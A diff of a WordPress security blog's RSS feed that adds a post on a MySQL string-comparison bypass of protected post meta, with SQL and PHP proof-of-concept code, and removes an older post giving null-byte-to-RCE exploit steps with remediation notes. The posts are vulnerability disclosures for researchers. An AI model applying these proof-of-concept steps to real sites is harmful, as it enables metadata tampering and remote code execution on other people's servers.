@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/tag/0day/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Thu, 23 Jul 2020 22:55:47 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 25 Jul 2020 22:09:55 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,95 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress core and MySQL string comparison</title>
+		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Sat, 25 Jul 2020 22:09:53 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=178</guid>
+
+					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>If we execute the following MySQL query against WP database</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
+</code></pre>
+
+
+
+<p>we will get results in case we had already uploaded media in the past</p>
+
+
+
+<pre class="wp-block-code"><code class="">+---------+---------+-------------------+--------------------------------+
+| meta_id | post_id | meta_key          | meta_value                     |
++---------+---------+-------------------+--------------------------------+
+|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
+|      71 |      99 | _wp_attached_file | wpdeeply                       |
++---------+---------+-------------------+--------------------------------+
+2 rows in set (0.00 sec)
+
+</code></pre>
+
+
+
+<p>This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn&#8217;t enough because it is on PHP side.</p>
+
+
+
+<p>Eli5 PoC</p>
+
+
+
+<p>Upload media file on your test WP instance and grab the&nbsp;<code>post_id</code>. Then run the following code snippet with your own data / post_id:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function bypass_protected_meta(){
+    //your demo media(post) id
+    $post_id = 99;
+    
+    $meta_key = "\x11_wp_attached_file";
+    $meta_value = "wpdeeply";
+    
+    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
+    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) &amp;&amp; ! is_protected_meta($meta_key) ){
+        update_post_meta($post_id, $meta_key, $meta_value);
+    }
+}
+
+add_action(init, "bypass_protected_meta");
+</code></pre>
+
+
+
+<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a> </li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>&nbsp;should be DB/MySQL check against current setup instead PHP one</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress importer arbitrary post create</title>
 		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
 		
@@ -891,74 +980,6 @@ add_action("init", "wprcedemo");
 
 
 <ul><li>Core files shouldn’t be writable by www-data user</li><li>Theme files shouldn’t be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress null byte to RCE &#8211; 0 day bug</title>
-		<link>https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sun, 12 Jul 2020 20:21:46 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=124</guid>
-
-					<description><![CDATA[It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives. What we have in the WP core&#160;class-wp-image-editor-imagick and we all know that PHP imagick prefers writeImageFile before writeImage because it is binary safe. What does this mean? This means if WP uses class-wp-image-editor-imagick as default image [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<hr class="wp-block-separator"/>
-
-
-
-<p>It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives.</p>
-
-
-
-<p>What we have in the WP core&nbsp;<code>class-wp-image-editor-imagick</code></p>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">$this->make_image( $filename, array( $image, 'writeImage' ), array( $filename ) );
-</code></pre>
-
-
-
-<p>and we all know that PHP imagick prefers <code>writeImageFile</code> before <code>writeImage</code> because it is binary safe. What does this mean? This means if WP uses <code>class-wp-image-editor-imagick</code> as default image editing engine we can salute our RCE because we are null byte away from it when <code>save</code> e.g. <code>_save</code> method is called.</p>
-
-
-
-<h2 id="eli5-poc">Eli5 PoC</h2>
-
-
-
-<ul><li>upload media file to your local WP called “nullbyte.jpg”</li><li>get its post id ( mine is 91 )</li><li>open mysql administration tool and issue following query:</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/nullbyte.jpg#','/go.php',char(0),'.gif' ) WHERE `wp_postmeta`.`post_id` = 91 and `wp_postmeta`.`meta_key` = '_wp_attached_file'
-</code></pre>
-
-
-
-<ul><li>go to media library, crop image + save</li><li>navigate to https://wp.local/wp-content/uploads/2020/07/nullbyte.jpg%23/go.php</li></ul>
-
-
-
-<h2 id="few-facts">Few facts</h2>
-
-
-
-<ul><li>Images manipulated with PHP Imagick will hold their old meta data (php shells / code will remain intact)</li><li>WP core had put a lot of efforts to protect <code>_wp_attached_file</code> meta value, but it is bypassable (next days disclosure)</li><li>WP in 5.5 via its site-health will warn users that they need to use ImageMagic on their servers :/</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li><li>have you ever heard about <a href="https://github.com/Slavco/wp-weaver">https://github.com/Slavco/wp-weaver</a> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>there are few another attack vectors than described above</li></ul>
-
-
-
-<h2 id="remediation">Remediation</h2>
-
-
-
-<ul><li>uploads dir shouldn’t be able to run PHP code</li><li>core files shouldn’t be writable by www-data user</li></ul>
 ]]></content:encoded>
 					
 		
